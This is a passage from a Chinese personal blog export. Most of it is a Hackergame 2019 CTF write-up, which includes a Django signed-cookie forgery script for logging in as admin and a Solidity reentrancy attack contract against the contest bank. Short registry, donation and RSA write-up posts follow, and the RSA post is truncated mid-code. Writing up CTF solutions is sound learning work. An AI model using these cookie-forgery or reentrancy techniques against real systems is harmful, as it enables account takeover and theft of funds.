<h2 id="三教奇妙夜"><a href="#三教奇妙夜" class="headerlink" title="三教奇妙夜"></a>三教奇妙夜</h2><p>解压出一个视频，使用脚本逐帧提取，把0x0为黑色（rgb为[0 0 0]）的图片提取出来<br>然后拼接图片中文字(字体为<code>Dejavu Sans Mono</code>)，即可得到flag</p>
<h2 id="小-U-的加密"><a href="#小-U-的加密" class="headerlink" title="小 U 的加密"></a>小 U 的加密</h2><p>异或<code>0x39</code>得到一个midi文件(文件头<code>4D 54 68 64</code>)，使用<code>Audacity</code>打开得到flag<br>注：flag 中的字符串全部为英文小写字符。</p>
<h2 id="献给最好的你"><a href="#献给最好的你" class="headerlink" title="献给最好的你"></a>献给最好的你</h2><p>反编译，定位到<code>com.hackergame.eternalEasterlyWind.data.LoginDataSource</code>类中的<code>login</code>方法<br>大致流程为：<br>对输入的密码进行base64编码，然后把该字符串大小写互转，与<code>pass1</code>:<code>AgfJA2vYz2fTztiWmtL3AxrOzNvUiq==</code>进行对比<br>一致则进入下一流程：<br>调用<code>logout</code>函数对<code>rawpassword</code>和一个自己数组进行运算，得到flag<br>所以对<code>pass1</code>进行大小写互转操作，得到<code>hackergame2019withfun!</code><br>输入即可得到flag<br>（个人是把代码copy出来，直接调用<code>logout</code>函数输出的）</p>
<h2 id="我想要个家"><a href="#我想要个家" class="headerlink" title="我想要个家"></a>我想要个家</h2><blockquote>
<p>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。</p>
</blockquote>
<h3 id="一开始的尝试"><a href="#一开始的尝试" class="headerlink" title="一开始的尝试"></a>一开始的尝试</h3><p>首先建立一个文件夹，作为程序执行的根目录（以yourhome为例）<br>并保证只存在这四个目录<code>/Kitchen /Lavatory /Bedroom /Living_Room]</code><br>然后运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot /yourhome/ ./IWantAHome-linux</span><br></pre></td></tr></table></figure>
<p>然后要求<code>/Bedroom/</code>下的<code>Microphone</code>和<code>Headset</code>的内容一致，考察链接的建立，执行语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln Microphone Headset</span><br></pre></td></tr></table></figure>
<p>然后要求<code>/Living_Room</code>中有一个记录当前时间(格式<code>20:15:30</code>)的<code>Clock</code>文件<br>写个脚本循环输出时间到该文件，另开终端运行，然后重新运行<code>IWantAHome-linux</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">date &quot;+%H:%M:%S&quot; &gt; /yourhome/Living_Room/Clock</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p>然后要求输入<code>sleep 10 seconds in shell</code>的命令，输入<code>sleep 10</code>提示环境变量中找不到该可执行文件，可见并不是字符串判断<br>于是添加sleep到根目录，执行<code>./sleep 10</code>，提示找不到<code>/dev/null</code>，添加该文件后还是报错，提示<code>fork/exec ./sleep: no such file or directory</code><br>各种尝试，最后还是选择逆向了</p>
<h3 id="逆向做法"><a href="#逆向做法" class="headerlink" title="逆向做法"></a>逆向做法</h3><p>使用IDA64打开该文件，利用<code>IDAGolangHelper</code>脚本恢复函数名，找到<code>main_main</code>函数，修改执行流程，直接输出flag</p>
<h2 id="被泄漏的姜戈"><a href="#被泄漏的姜戈" class="headerlink" title="被泄漏的姜戈"></a>被泄漏的姜戈</h2><p>在<code>github</code>找到用户<code>openlug</code>创建的库:<a href="https://github.com/openlug/django-common">https://github.com/openlug/django-common</a><br>git clone下来，查看<code>app/views.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> authenticate, login, logout</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.decorators <span class="keyword">import</span> login_required</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render, redirect</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> reverse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;Rabbit House 成员管理系统&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.user.is_authenticated:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&#x27;app/index.html&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: name</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.POST[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.POST[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        user = authenticate(request, username=username, password=password)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            login(request, user)</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;profile&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.user.username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;flag redacted. login as admin on server to get flag.&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        user_profile = <span class="string">&quot;仅 admin 用户可阅览 flag。&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;app/profile.html&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: request.user,</span><br><span class="line">        <span class="string">&quot;profile&quot;</span>: user_profile</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_out</span>(<span class="params">request</span>):</span></span><br><span class="line">    logout(request)</span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.contrib.auth <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_last_login</span>(<span class="params">sender, user, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">models.update_last_login = update_last_login</span><br></pre></td></tr></table></figure>
<p>关键在于<code>if request.user.username == &quot;admin&quot;:</code>判断，要让当前用户的用户名为<code>admin</code>，推测是Cookie欺骗<br>对Cookie进行解密（完整代码见后文）得到</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_auth_user_id&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;_auth_user_backend&#x27;</span>: <span class="string">&#x27;django.contrib.auth.backends.ModelBackend&#x27;</span>, <span class="string">&#x27;_auth_user_hash&#x27;</span>: <span class="string">&#x27;0a884f8b987fca1a92c6f93d9042d83eea72d98d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>查看Django源码得知，<code>_auth_user_backend</code>默认只有这一种，所以肯定是对<code>_auth_user_id</code>和<code>_auth_user_hash</code>进行替换<br>直接把<code>_auth_user_id</code>改为<code>1</code>，发现返回302跳转，所以应该还要得出admin的<code>_auth_user_hash</code>值</p>
<p>源码中有数据库文件<code>db.sqlite3</code>，查看发现其中有<code>pbkdf2_sha256</code>加密后的密码<br><code>admin</code>: <code>pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=</code><br><code>guest</code>: <code>pbkdf2_sha256$150000$8GFvEvr58uL6$YWM8Fqu8t/UYcW4iHqxXpkKPMEzlUvxbeHYJI45qBHM=</code><br>找到生成<code>_auth_user_hash</code>的代码(<code>django.contrib.auth.bast_user.py</code>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session_auth_hash</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Return an HMAC of the password field.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key_salt = <span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span></span><br><span class="line">    <span class="keyword">return</span> salted_hmac(key_salt, self.password).hexdigest()</span><br></pre></td></tr></table></figure>
<p>copy出来，利用加密后的密码生成哈希值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">hash1 = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash1)</span><br></pre></td></tr></table></figure>
<p>得到<code>0a884f8b987fca1a92c6f93d9042d83eea72d98d</code>，恰好是解密出的<code>_auth_user_hash</code>值，验证算法成功<br>然后修改<code>_auth_user_id</code>和<code>_auth_user_hash</code>，加密生成Cookie，requests.get即可<br>完整脚本（放置在<code>openlug/</code>下）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,os,json,requests,re</span><br><span class="line">os.environ.setdefault(<span class="string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>,<span class="string">&#x27;settings&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.backends <span class="keyword">import</span> signed_cookies</span><br><span class="line"><span class="keyword">from</span> django.utils.crypto <span class="keyword">import</span> salted_hmac</span><br><span class="line"></span><br><span class="line"><span class="comment"># key=None : SECRET_KEY</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.loads(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,max_age=<span class="number">1209600</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> signing.dumps(sess,key=<span class="literal">None</span>,salt = <span class="string">&quot;django.contrib.sessions.backends.signed_cookies&quot;</span>,compress = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requestByCk</span>(<span class="params">ck</span>):</span></span><br><span class="line">    mcookie = &#123;<span class="string">&quot;sessionid&quot;</span>:ck&#125;</span><br><span class="line">    r = requests.get(<span class="string">&quot;http://202.38.93.241:10019/profile&quot;</span>,cookies = mcookie,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">        rawstr = (r.text)</span><br><span class="line">        username = re.findall(<span class="string">r&quot;欢迎您，(.....)！&quot;</span>, rawstr)</span><br><span class="line">        <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            flag = re.findall(<span class="string">r&quot;flag&#123;.*&#125;&quot;</span>, rawstr)</span><br><span class="line">            <span class="built_in">print</span>(flag[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span>(r.status_code == <span class="number">302</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong Cookie.&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error:&quot;</span>+r.status_code) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = <span class="string">&quot;.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iKXmf:PfphreMrpv-FPLjjGGKUkcFgc2Q&quot;</span></span><br><span class="line">sess = decode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;decode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE=&quot;</span></span><br><span class="line">adminHash = salted_hmac(<span class="string">&quot;django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash&quot;</span>, password).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(adminHash)</span><br><span class="line"></span><br><span class="line">sess[<span class="string">&quot;_auth_user_id&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">sess[<span class="string">&quot;_auth_user_hash&quot;</span>] = adminHash</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;changed:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">sess = encode(sess)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;encode:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sess)</span><br><span class="line">requestByCk(sess)</span><br></pre></td></tr></table></figure>

<h2 id="PowerShell-迷宫"><a href="#PowerShell-迷宫" class="headerlink" title="PowerShell 迷宫"></a>PowerShell 迷宫</h2><p>连接上服务器，cd到根目录，find查找<code>PSMaze.dll</code>，发现在<code>opt</code>文件夹中<br>使用<code>base64</code>命令输出，拿到程序二进制进行分析<br>发现在<code>MazeProvider.GetCellRepr</code>函数中会对当前节点进行判断，如果是终点则进行sha256计算，计算flag<br>写个powershell脚本遍历即可（使用Where-Object进行过滤，不走重复路线）<br>脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Import-Module ./PSMaze.dll</span><br><span class="line"></span><br><span class="line">function print_i($i) &#123;</span><br><span class="line">    if($i.X -eq 63)&#123;</span><br><span class="line">        if($i.Y -eq 63)&#123;</span><br><span class="line">        write-host $i.PSPath -fore green</span><br><span class="line">        write-host $i.Flag -fore red</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function foreachPath($startFolder, $passDir) &#123;</span><br><span class="line">    $colItems = Get-ChildItem $startFolder | Where-Object &#123; $_.Direction -ne $passDir &#125; | Sort-Object</span><br><span class="line">    foreach ($i in $colItems) &#123;</span><br><span class="line">        print_i $i</span><br><span class="line">        $passDir = getInv $i.PSPath</span><br><span class="line">        foreachPath $i.PSPath $passDir</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getInv($path) &#123;</span><br><span class="line">    $direction = split-path $path -Leaf</span><br><span class="line">    if ($direction -eq &quot;Up&quot;) &#123;</span><br><span class="line">        return &quot;Down&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Down&quot;) &#123;</span><br><span class="line">        return  &quot;Up&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Left&quot;) &#123;</span><br><span class="line">        return &quot;Right&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($direction -eq &quot;Right&quot;) &#123;</span><br><span class="line">        return &quot;Left&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreachPath &quot;Maze:/&quot; &quot;Up&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right</span><br><span class="line">flag&#123;D0_y0u_1ik3_PSC0r3_n0w_2C6BE488&#125;</span><br></pre></td></tr></table></figure>

<h2 id="韭菜银行"><a href="#韭菜银行" class="headerlink" title="韭菜银行"></a>韭菜银行</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(<span class="string">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span>,<span class="number">2</span>,<span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure>
<p>获取到secert的值，提交即可得到flag</p>
<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><code>withdraw</code>函数存在重入和溢出漏洞，构造攻击合约，使余额为一个大数<br>然后使用攻击合约调用<code>get_flag_2</code>，即可设置got_flag字段的值，从而获得flag<br>攻击合约:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.26;</span><br><span class="line"></span><br><span class="line">contract JCBank &#123;</span><br><span class="line">    mapping (address =&gt; uint) public balance;</span><br><span class="line">    mapping (uint =&gt; bool) public got_flag;</span><br><span class="line">    uint128 secret;</span><br><span class="line"></span><br><span class="line">    constructor (uint128 init_secret) public &#123;</span><br><span class="line">        secret = init_secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balance[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_1(uint128 guess) public view returns(string) &#123;</span><br><span class="line">        require(guess == secret);</span><br><span class="line"></span><br><span class="line">        bytes memory h = new bytes(32);</span><br><span class="line">        for (uint i = 0; i &lt; 32; i++) &#123;</span><br><span class="line">            uint b = (secret &gt;&gt; (4 * i)) &amp; 0xF;</span><br><span class="line">            if (b &lt; 10) &#123;</span><br><span class="line">                h[31 - i] = byte(b + 48);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                h[31 - i] = byte(b + 87);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(abi.encodePacked(&quot;flag&#123;&quot;, h, &quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_flag_2(uint user_id) public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt; 1000000000000 ether);</span><br><span class="line">        got_flag[user_id] = true;</span><br><span class="line">        balance[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Battach&#123;</span><br><span class="line">    address target;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 money;</span><br><span class="line">    JCBank g;</span><br><span class="line">    uint flag = 0;</span><br><span class="line">    </span><br><span class="line">    modifier ownerOnly &#123;</span><br><span class="line">        require(owner == msg.sender);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    // 构造函数初始化合约所有者的地址</span><br><span class="line">    constructor() payable public&#123;</span><br><span class="line">        target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;</span><br><span class="line">         g = JCBank(target);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        money = 1;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function getFlag(uint _user_id) ownerOnly payable&#123;</span><br><span class="line">     g.get_flag_2(_user_id);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    //开始攻击合约</span><br><span class="line">    function startattach() ownerOnly payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1);</span><br><span class="line">       flag = 0;</span><br><span class="line">       g.deposit.value(money)();</span><br><span class="line">       g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    // 销毁合约，相当于C++里的析构</span><br><span class="line">    function stopattach() ownerOnly&#123;</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //fallback 函数</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        flag = 1;</span><br><span class="line">        g.withdraw(money);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="没有-BUG-的教务系统"><a href="#没有-BUG-的教务系统" class="headerlink" title="没有 BUG 的教务系统"></a>没有 BUG 的教务系统</h2><h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>定位到判断代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i)</span><br><span class="line">    temp_password[i] = ((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) | i) &amp; ~((temp_password[i] | temp_password[i + <span class="number">1</span>]) &amp; ~(temp_password[i] &amp; temp_password[i + <span class="number">1</span>]) &amp; i);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(temp_password, <span class="string">&quot;\x44\x00\x02\x41\x43\x47\x10\x63\x00&quot;</span>, <span class="number">9</span>)) &#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Bad guy! Wrong password!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会对当前位和下一位进行运算，但是循环并没有操作最后一个字符00，所以从后往前逆推即可得到第一个flag</p>
<h2 id="比赛时间内未完成的题"><a href="#比赛时间内未完成的题" class="headerlink" title="比赛时间内未完成的题"></a>比赛时间内未完成的题</h2><p>见<a href="https://blog.xhyeax.com/2019/10/22/hackersgame-2019-fails">Hackersgame 2019 的一些失败尝试及复现</a></p>
<p>还是太菜了 = =</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>手动修复Windows打开方式（修改注册表）</title>
    <url>/2018/11/29/how-to-fix-fileExts/</url>
    <content><![CDATA[<p>由于不小心把.gitignore设置成了以文本形式打开，导致在Explorer中显示为空文件名的文本文件（非常不顺眼）<br>（Windows的默认设置中无法删除打开方式）<br>而且有的文件手动设置了默认打开方式后也不管用<br>于是通过修改注册表实现</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p>HKEY_LOCAL_MACHINE\Software\Classes：该注册表项包括适用所有用户的默认文件关联设置<br>HKEY_CURRENT_USER\Software\Classes：该注册表项包含只适用当前用户的文件关联设置（将覆盖HKEY_LOCAL_MACHINE项中的设置）<br>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts：该注册表项包含用户自定义的打开方式（勾选始终使用该方式打开）</p>
</blockquote>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>Win+r, regedit定位到上述路径，把.gitignore项删除即可<br>如果需要修复其他拓展名的打开方式，可删除该项，导入.reg文件（修改为需要的拓展名）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md\OpenWithList]</span><br><span class="line">&quot;a&quot;=&quot;NOTEPAD.EXE&quot;</span><br><span class="line">&quot;MRUList&quot;=&quot;a&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.md\OpenWithProgids]</span><br><span class="line">&quot;txtfile&quot;=hex(0):</span><br></pre></td></tr></table></figure>

<p>最后重启资源管理器即可</p>
<h3 id="附上Windows-Explorer中直接创建无文件名文件的方法"><a href="#附上Windows-Explorer中直接创建无文件名文件的方法" class="headerlink" title="附上Windows Explorer中直接创建无文件名文件的方法"></a>附上Windows Explorer中直接创建无文件名文件的方法</h3><p>显示文件拓展名后，右键新建文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.gitignore.</span><br></pre></td></tr></table></figure>
<p>保存即可（由于没有拓展名，会自动删除末尾的点）</p>
<p>参考：<a href="https://blog.csdn.net/erikaIT/article/details/71637167">windows注册表文件关联机制</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>如何支持博主？</title>
    <url>/2018/12/01/how-to-support-me/</url>
    <content><![CDATA[<p>众所周知，支持主要分为经济上和精神上的支持。</p>
<span id="more"></span>
<h1 id="经济上"><a href="#经济上" class="headerlink" title="经济上"></a>经济上</h1><p>我 博主 打钱 ( • ̀ω•́ )</p>
<h2 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h2><img src="/assets/img/alipay.jpg" width = "300" height = "300"  align=center />

<h1 id="精神上"><a href="#精神上" class="headerlink" title="精神上"></a>精神上</h1><p>用意念支持博主即可(´・ω・`)</p>
]]></content>
      <tags>
        <tag>支持</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 第二届春秋欢乐赛 RSA256 Writeup</title>
    <url>/2019/01/26/icq-2nd-happy-rsa256/</url>
    <content><![CDATA[<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>解压得到四个文件，有一个<code>public.key</code>和三个加密过的文件，于是先把p和q解出来</p>
<h2 id="得到e和n"><a href="#得到e和n" class="headerlink" title="得到e和n"></a>得到e和n</h2><p><code>openssl rsa -pubin -text -modulus -in warmup -in public.key</code><br>得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=D99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB</span><br></pre></td></tr></table></figure>
<h2 id="使用yafu分解，得到p和q"><a href="#使用yafu分解，得到p和q" class="headerlink" title="使用yafu分解，得到p和q"></a>使用yafu分解，得到p和q</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p = 302825536744096741518546212761194311477</span><br><span class="line">q = 325045504186436346209877301320131277983</span><br></pre></td></tr></table></figure>
<h2 id="求出d"><a href="#求出d" class="headerlink" title="求出d"></a>求出d</h2><p>使用gmpy</p>
<h2 id="解密并打印出flag"><a href="#解密并打印出flag" class="headerlink" title="解密并打印出flag"></a>解密并打印出flag</h2><h3 id="使用rsa模块"><a href="#使用rsa模块" class="headerlink" title="使用rsa模块"></a>使用rsa模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xD99E952296A6D960DFC2504ABA545B9442D60A7B9E930AFF451C78EC55D555EB</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">302825536744096741518546212761194311477</span></span><br><span class="line">q = <span class="number">325045504186436346209877301320131277983</span></span><br><span class="line">d = <span class="number">0x4547B732CBC3527104CB57C4728D6899B44C4994FAE2713D6B594BC0F522A41</span></span><br><span class="line">ret = <span class="string">&quot;&quot;</span></span><br><span class="line">privatekey = rsa.PrivateKey(n , e , d , p , q)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span 